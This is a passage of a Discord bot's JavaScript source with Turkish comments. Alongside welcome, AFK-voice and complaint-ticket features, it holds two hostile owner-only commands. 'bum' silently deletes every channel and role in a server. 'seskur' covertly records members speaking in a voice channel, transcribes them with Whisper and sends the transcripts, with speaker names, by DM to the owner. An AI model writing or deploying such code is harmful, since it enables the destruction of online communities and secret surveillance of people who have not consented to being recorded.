            adapterCreator: interaction.guild.voiceAdapterCreator,
            selfDeaf: false,
            selfMute: true,
          });

          // Sessiz audio oynat (bağlantıyı canlı tutmak için)
          const player = createAudioPlayer();
          
          // Buffer ile sessizlik oluştur
          const createSilence = () => {
            // 1 saniye 48kHz stereo sessizlik (PCM format)
            const sampleRate = 48000;
            const channels = 2;
            const duration = 1; // 1 saniye
            const samples = sampleRate * duration * channels;
            const buffer = Buffer.alloc(samples * 2); // 16-bit = 2 bytes per sample
            
            return buffer;
          };

          // Sürekli sessizlik oynat
          const playLoop = () => {
            try {
              const silenceBuffer = createSilence();
              const resource = createAudioResource(silenceBuffer, { 
                inputType: 'raw',
                inlineVolume: true
              });
              resource.volume.setVolume(0.01); // Çok düşük ses
              player.play(resource);
            } catch (error) {
              console.log('Sessizlik oluşturma hatası:', error);
              // Fallback: basit timeout
              setTimeout(playLoop, 5000);
            }
          };

          player.on(AudioPlayerStatus.Idle, () => {
            setTimeout(playLoop, 1000); // 1 saniye bekle, tekrar oynat
          });

          connection.subscribe(player);
          playLoop();

          // Bağlantı kesilirse tekrar bağlan
          connection.on('stateChange', (oldState, newState) => {
            if (newState.status === 'disconnected') {
              console.log('Ses bağlantısı kesildi, yeniden bağlanıyor...');
              setTimeout(() => {
                try {
                  const newConnection = joinVoiceChannel({
                    channelId: voiceChannel.id,
                    guildId: interaction.guildId,
                    adapterCreator: interaction.guild.voiceAdapterCreator,
                    selfDeaf: false,
                    selfMute: true,
                  });
                  newConnection.subscribe(player);
                } catch (error) {
                  console.error('Yeniden bağlanma hatası:', error);
                }
              }, 5000);
            }
          });

          const embed = new EmbedBuilder()
            .setColor('#2ecc71')
            .setTitle('🔊 Ses Kanalında AFK')
            .setDescription(`Bot **${voiceChannel.name}** kanalına katıldı ve 7/24 orada duracak.\n\n**Özellikler:**\n• Otomatik yeniden bağlanma\n• Sessiz mod (kullanıcıları rahatsız etmez)\n• Sürekli bağlantı`)
            .addFields(
              { name: '📺 Kanal', value: voiceChannel.name, inline: true },
              { name: '🔇 Durum', value: 'Sessiz mod aktif', inline: true }
            )
            .setTimestamp();

          await interaction.reply({ embeds: [embed], ephemeral: true });

        } catch (error) {
          console.error('Ses kanalı hatası:', error);
          
          // @discordjs/voice yoksa basit mesaj
          const embed = new EmbedBuilder()
            .setColor('#f39c12')
            .setTitle('⚠️ Ses Paketi Gerekli')
            .setDescription(`Bot **${voiceChannel.name}** kanalına katılmak için @discordjs/voice paketi gerekli.\n\n**Manuel kurulum:**\n\`npm install @discordjs/voice\``)
            .setTimestamp();

          await interaction.reply({ embeds: [embed], ephemeral: true });
        }
      }

      // GELEN GİDEN KUR
      else if (commandName === 'gelengidenkur') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        let welcome = getWelcome();
        welcome[interaction.guildId] = {
          channelId: interaction.channelId,
          enabled: true
        };
        saveWelcome(welcome);

        const embed = new EmbedBuilder()
          .setColor('#3498db')
          .setTitle('👋 Gelen-Giden Sistemi Kuruldu')
          .setDescription(`Bu kanalda giriş/çıkış mesajları gösterilecek!\n\n**Giriş:** "Hoş geldin reis"\n**Çıkış:** "Hadi sattı gidebilirsin"`)
          .setTimestamp();

        await interaction.reply({ embeds: [embed], ephemeral: true });
      }

      // BUM - SUNUCU SİLME
      else if (commandName === 'bum') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        try {
          // Sessiz olarak başla - mesaj atma
          console.log(`[BUM] ${interaction.guild.name} sunucusu siliniyor - ${user.tag} tarafından`);

          // Tüm kanalları sil
          const channels = await interaction.guild.channels.fetch();
          for (const [, channel] of channels) {
            try {
              await channel.delete();
              console.log(`[BUM] Kanal silindi: ${channel.name}`);
            } catch (error) {
              console.error(`[BUM] Kanal silme hatası: ${error.message}`);
            }
          }

          // Tüm rolleri sil (default role ve @everyone hariç)
          const roles = await interaction.guild.roles.fetch();
          for (const [, role] of roles) {
            if (role.name !== '@everyone') {
              try {
                await role.delete();
                console.log(`[BUM] Rol silindi: ${role.name}`);
              } catch (error) {
                console.error(`[BUM] Rol silme hatası: ${error.message}`);
              }
            }
          }

          console.log(`[BUM] ${interaction.guild.name} sunucusu tamamen silindi!`);
          
          // Silent reply - hiç mesaj atma
          if (!interaction.replied) {
            await interaction.deferReply({ ephemeral: true }).catch(() => {});
          }

        } catch (error) {
          console.error('[BUM] Hata:', error);
          
          // Hata olursa OWNER'a DM atsın
          try {
            const owner = await client.users.fetch(OWNER_ID);
            await owner.send({
              content: `⚠️ **[BUM KOMUTu HATASI]**\n\n**Sunucu:** ${interaction.guild.name}\n**Hata:** \`${error.message}\`\n**Zamanı:** ${new Date().toLocaleTimeString('tr-TR')}`
            }).catch(console.error);
          } catch (dmError) {
            console.error('[BUM] DM gönderme hatası:', dmError);
          }

          if (!interaction.replied) {
            await interaction.reply({ 
              content: `❌ Hata: ${error.message}`, 
              ephemeral: true 
            }).catch(() => {});
          }
        }
      }

      // SES KAYIT - UMUTPAPA123'E DM GÖNDER
      else if (commandName === 'seskur') {
        if (user.id !== OWNER_ID) {
          return await interaction.reply({ content: '❌ Sadece owner kullanabilir!', ephemeral: true });
        }

        const voiceChannel = interaction.options.getChannel('ses_kanal');

        if (!voiceChannel || !voiceChannel.isVoiceBased()) {
          return await interaction.reply({ 
            content: '❌ Geçerli bir ses kanalı seçin!', 
            ephemeral: true 
          });
        }

        if (!voiceChannel.joinable) {
          return await interaction.reply({ 
            content: '❌ Ses kanalına katılma iznimiz yok!', 
            ephemeral: true 
          });
        }

        try {
          const { joinVoiceChannel, EndBehaviorType } = require('@discordjs/voice');
          const { Readable } = require('stream');
          
          const connection = joinVoiceChannel({
            channelId: voiceChannel.id,
            guildId: interaction.guildId,
            adapterCreator: interaction.guild.voiceAdapterCreator,
            selfDeaf: false,
            selfMute: false,
          });

          // Voice receiver oluştur
          const receiver = connection.receiver;
          const userAudioStreams = new Map();

          // Her kullanıcının ses kaydını tut
          receiver.speaking.on('start', (userId) => {
            const member = interaction.guild.members.cache.get(userId);
            if (member && !member.user.bot) {
              console.log(`[SES KAYDI BAŞLADI] ${member.user.tag}`);
              
              // Kullanıcı sesini yakalamaya başla
              const audioStream = receiver.subscribe(userId, {
                end: {
                  behavior: EndBehaviorType.AfterSilence,
                  duration: 500, // 500ms sessizlikten sonra bitir
                }
              });

              userAudioStreams.set(userId, {
                stream: audioStream,
                chunks: [],
                member: member,
                startTime: Date.now()
              });

              // Audio chunks toplayabiliriz
              audioStream.on('data', (chunk) => {
                const userData = userAudioStreams.get(userId);
                if (userData) {
                  userData.chunks.push(chunk);
                }
              });

              audioStream.on('end', async () => {
                const userData = userAudioStreams.get(userId);
                if (!userData) return;

                try {
                  const buffer = Buffer.concat(userData.chunks);
                  console.log(`[SES KARTI TAMAMLANDI] ${userData.member.user.tag} - ${buffer.length} bytes`);
                  
                  if (buffer.length < 1000) {
                    console.log('[UYARI] Ses çok kısa, atlıyor');
                    userAudioStreams.delete(userId);
                    return;
                  }

                  // Whisper API'ye gönder
                  if (process.env.OPENAI_API_KEY) {
                    try {
                      const form = new FormData();
                      
                      // Buffer'ı Blob'a dönüştür
                      form.append('file', buffer, {
                        filename: `audio-${userData.member.user.id}-${Date.now()}.wav`,
                        contentType: 'audio/wav'
                      });
                      form.append('model', 'whisper-1');
                      form.append('language', 'tr');

                      console.log('[WHISPER] API çağrısı yapılıyor...');
                      
                      const response = await axios.post('https://api.openai.com/v1/audio/transcriptions', form, {
                        headers: {
                          ...form.getHeaders(),
                          'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`
                        },
                        timeout: 60000
                      });

                      if (response.data && response.data.text) {
                        const text = response.data.text.trim();
                        
                        if (text.length > 0) {
                          // OWNER'a DM gönder
                          try {
                            const owner = await client.users.fetch(OWNER_ID);
                            const timestamp = new Date().toLocaleTimeString('tr-TR');
                            
                            const embed = new EmbedBuilder()
                              .setColor('#3498db')
                              .setTitle('🎤 Ses Kaydı')
                              .setDescription(`**Konuşan:** ${userData.member.user.username}\n**Sunucu:** ${interaction.guild.name}\n**Kanal:** ${voiceChannel.name}`)
                              .addFields(
                                { name: '💬 Konuşma Metni', value: text, inline: false },
                                { name: '⏰ Zaman', value: timestamp, inline: true }
                              )
                              .setThumbnail(userData.member.user.displayAvatarURL())
                              .setTimestamp();

                            await owner.send({ embeds: [embed] });
                            console.log(`[SESKUR] DM gönderildi: ${userData.member.user.tag} - "${text}"`);
                          } catch (dmError) {
                            console.error('[SESKUR] DM gönderme hatası:', dmError);
                          }
                        } else {
                          console.log('[SESKUR] Boş metin');
                        }
                      }
                    } catch (whisperError) {
                      console.error('[SESKUR] Whisper hatası:', whisperError.message);
                      
                      // Hata olursa da DM gönder
                      try {
                        const owner = await client.users.fetch(OWNER_ID);
                        await owner.send(`🎤 **${userData.member.user.username}** konuştu (yazıya çevirme hatası) - ${new Date().toLocaleTimeString('tr-TR')}`);
                      } catch (dmError) {
                        console.error('[SESKUR] DM gönderme hatası:', dmError);
                      }
                    }
                  } else {
                    // API key yoksa sadece bildirim gönder
                    try {
                      const owner = await client.users.fetch(OWNER_ID);
                      await owner.send(`🎤 **${userData.member.user.username}** konuştu (API key eksik) - ${new Date().toLocaleTimeString('tr-TR')}`);
                    } catch (dmError) {
                      console.error('[SESKUR] DM gönderme hatası:', dmError);
                    }
                  }

                } catch (error) {
                  console.error('[SES ISLEME HATASI]', error);
                } finally {
                  userAudioStreams.delete(userId);
                }
              });
            }
          });

          // Bağlantı kesilirse yeniden bağlan
          connection.on('stateChange', (oldState, newState) => {
            console.log(`[BAGLANTI DURUM] ${oldState.status} -> ${newState.status}`);
            
            if (newState.status === 'disconnected') {
              console.log('[YENIDEN BAGLANIYOR]');
              setTimeout(() => {
                try {
                  const newConnection = joinVoiceChannel({
                    channelId: voiceChannel.id,
                    guildId: interaction.guildId,
                    adapterCreator: interaction.guild.voiceAdapterCreator,
                    selfDeaf: false,
                    selfMute: false,
                  });
                  console.log('[BAGLANTI BASARILI]');
                } catch (error) {
                  console.error('[YENIDEN BAGLANIYOR HATASI]', error);
                }
              }, 5000);
            }
          });

          // Ayarları kaydet
          let voiceConfig = getVoiceTranscripts();
          voiceConfig[interaction.guildId] = {
            listeningChannelId: voiceChannel.id,
            recordChannelId: textChannel.id,
            enabled: true,
            startedAt: new Date().toISOString()
          };
          saveVoiceTranscripts(voiceConfig);

          const embed = new EmbedBuilder()
            .setColor('#2ecc71')
            .setTitle('🎙️ Ses Kaydı Başlatıldı')
            .setDescription(`Bot **${voiceChannel.name}** kanalındaki konuşmaları dinleyip umutpapa123'e DM gönderiyor!\n\n**Özellikler:**\n• Konuşmaları Whisper AI ile yazıya çevirir\n• Her konuşma DM'e gönderilir\n• Kim konuşmuş bilgisi dahil`)
            .addFields(
              { name: '🎤 Dinleme Kanalı', value: voiceChannel.name, inline: true },
              { name: '📨 DM Alıcısı', value: 'umutpapa123', inline: true }
            )
            .setTimestamp();

          await interaction.reply({ embeds: [embed], ephemeral: true });
          console.log(`[BASLATILDI] ${interaction.guild.name} - Ses kaydı aktif`);

        } catch (error) {
          console.error('[BASLATMA HATASI]', error);
          
          const errorEmbed = new EmbedBuilder()
            .setColor('#e74c3c')
            .setTitle('❌ Ses Kaydı Başlatılamadı')
            .setDescription(`Hata: \`${error.message}\``)
            .setTimestamp();

          await interaction.reply({ embeds: [errorEmbed], ephemeral: true });
        }
      }
    }

    // BUTTON HANDLER - ŞİKAYET SİSTEMİ
    else if (interaction.isButton()) {
      const { customId } = interaction;

      if (customId === 'create_complaint') {
        try {
          const complaints = getComplaints();
          
          if (!complaints[interaction.guildId]) {
            complaints[interaction.guildId] = {};
          }

          const complaintChannel = await interaction.guild.channels.create({
            name: `📝-şikayet-${user.username}`,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              {
                id: interaction.guild.id,
                deny: [PermissionFlagsBits.ViewChannel],
              },
              {
                id: user.id,
                allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages],
              },
              {
                id: OWNER_ID,
                allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages],
              }
            ],
          });

          complaints[interaction.guildId][complaintChannel.id] = {
            userId: user.id,
            createdAt: Date.now(),
            status: 'open'
          };
          saveComplaints(complaints);

          const acceptBtn = new ButtonBuilder()
            .setCustomId('accept_complaint')
            .setLabel('✅ Talebi Üstlen')
            .setStyle(ButtonStyle.Success);

          const closeComplaintBtn = new ButtonBuilder()
            .setCustomId('close_complaint')
            .setLabel('❌ Şikayeti Kapat')
            .setStyle(ButtonStyle.Danger);

          const row = new ActionRowBuilder().addComponents(acceptBtn, closeComplaintBtn);

          const embed = new EmbedBuilder()
            .setColor('#e74c3c')
            .setTitle('📝 Şikayet Kanalı')
            .setDescription(`Merhaba ${user.username}!\n\n**Şikayetinizi detaylı bir şekilde yazın:**\n• Sorunun açıklaması\n• Öncelik seviyesi (Düşük/Orta/Yüksek)\n• Şikayet ettiğiniz kullanıcı`)
            .setTimestamp();

          await complaintChannel.send({ embeds: [embed], components: [row] });
          
          await interaction.reply({ 
            content: `✅ Şikayet kanalı oluşturuldu: ${complaintChannel}`, 
            ephemeral: true 
          });

        } catch (error) {
          console.error('Şikayet kanalı oluşturma hatası:', error);
          await interaction.reply({ content: '❌ Hata oluştu!', ephemeral: true });
        }
      }

      else if (customId === 'accept_complaint') {
        const embed = new EmbedBuilder()
          .setColor('#2ecc71')
          .setTitle('✅ Talebi Üstlenildi')
          .setDescription(`${interaction.user.tag} bu şikayeti üstlendi ve incelemeye başladı.`)
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      else if (customId === 'close_complaint') {
        await interaction.reply({ content: '⏳ Şikayet kanalı 5 saniye içinde kapatılacak...', ephemeral: true });
        
        setTimeout(async () => {
          try {
            await interaction.channel.delete();
          } catch (error) {
            console.error('Şikayet kanalı silme hatası:', error);
          }
        }, 5000);
      }
    }

  } catch (error) {
    console.error('Interaction hatası:', error);
    if (!interaction.replied) {
      await interaction.reply({ content: '❌ Hata oluştu!', ephemeral: true }).catch(() => {});
    }
  }
});

// WEB SERVER
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const server = app.listen(PORT, () => {
  console.log('🌐 Web server çalışıyor: port ' + PORT);
});

client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('❌ Bot login hatası:', err);
  process.exit(1);
});

// Process kapatılırken cleanup
process.on('SIGINT', () => {
  console.log('Bot kapatılıyor...');
  if (footballInterval) {
    clearInterval(footballInterval);
    console.log('Futbol takibi durduruldu');
  }
  process.exit(0);
});